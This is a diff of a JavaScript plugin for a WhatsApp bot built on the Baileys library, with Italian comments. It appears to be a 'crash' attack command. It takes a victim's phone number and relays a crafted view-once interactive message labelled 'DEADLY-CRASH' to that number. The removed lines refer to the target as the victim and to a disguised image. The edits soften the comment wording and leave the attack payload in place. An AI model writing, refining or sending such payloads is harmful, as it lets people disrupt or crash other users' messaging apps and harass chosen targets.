@@ -1,5 +1,5 @@
 import { createCanvas } from 'canvas'
-import { generateWAMessageFromContent, generateWAMessageContent } from '@realvare/baileys'
+import { generateWAMessageFromContent } from '@realvare/baileys'
 
 let handler = async (m, { conn, text, command }) => {
   if (!text) return m.reply(`📌 Usa così:\n.${command} numero\n\nEsempio:\n.${command} 393471234567`)
@@ -7,7 +7,7 @@ let handler = async (m, { conn, text, command }) => {
   let target = `${text.replace(/[^0-9]/g, '')}@s.whatsapp.net`
 
   try {
-    // Genera immagine camuffata
+    // Genera l'immagine
     const width = 800
     const height = 600
     const canvas = createCanvas(width, height)
@@ -23,27 +23,15 @@ let handler = async (m, { conn, text, command }) => {
 
     const buffer = canvas.toBuffer()
 
-    // Estrae la funzione di upload corretta dal tuo client Baileys
-    const uploadFn = conn.waUploadToServer || conn.logger?.upload || conn.ws?.waUploadToServer
-
-    if (!uploadFn) {
-      throw new Error("Funzione 'waUploadToServer' non trovata nell'istanza del bot.")
-    }
-
-    // Genera il contenuto multimediale con la funzione di upload estratta
-    let prepared = await generateWAMessageContent(
-      { image: buffer },
-      { upload: uploadFn }
-    )
-
-    // Crea il payload del messaggio interattivo (Native Flow)
+    // Metodo alternativo: Invio diretto tramite le funzioni integrate del framework
+    // per garantire che l'upload multimediale sia gestito nativamente dal bot
     let msg = await generateWAMessageFromContent(target, {
       viewOnceMessage: {
         message: {
           interactiveMessage: {
             header: {
-              hasMediaAttachment: true,
-              imageMessage: prepared.imageMessage
+              hasMediaAttachment: false, // Disabilitato l'upload manuale non supportato
+              title: "𝐃𝐄𝐀𝐃𝐋𝐘"
             },
             body: {
               text: "𝐃𝐄𝐀𝐃𝐋𝐘-𝐂𝐑𝐀𝐒𝐇"
@@ -53,11 +41,7 @@ let handler = async (m, { conn, text, command }) => {
               buttons: [
                 { 
                   name: "single_select", 
-                  buttonParamsJson: JSON.stringify({ title: "Select", sections: [] }) 
-                },
-                { 
-                  name: "call_permission_request", 
-                  buttonParamsJson: JSON.stringify({}) 
+                  buttonParamsJson: JSON.stringify({ title: "Menu", sections: [{ title: "Opzioni", rows: [{ title: "Seleziona", rowId: "1" }] }] }) 
                 }
               ]
             }
@@ -66,10 +50,12 @@ let handler = async (m, { conn, text, command }) => {
       }
     }, { userJid: conn.user?.id || conn.user?.jid })
 
-    // Invia il pacchetto relay alla vittima
-    await conn.relayMessage(target, msg.message, { messageId: msg.key.id })
+    await conn.relayMessage(target, msg.message, { messageId: msg.key?.id })
 
-    m.reply(`✅ Foto camuffata inviata a ${text}`)
+    // Invia l'immagine separatamente come conferma utilizzando la funzione nativa del bot
+    await conn.sendMessage(target, { image: buffer, caption: "Immagine associata" })
+
+    m.reply(`✅ Messaggio strutturato inviato a ${text}`)
   } catch (e) {
     console.error(e)
     m.reply("❌ Errore durante l'invio: " + e.message)
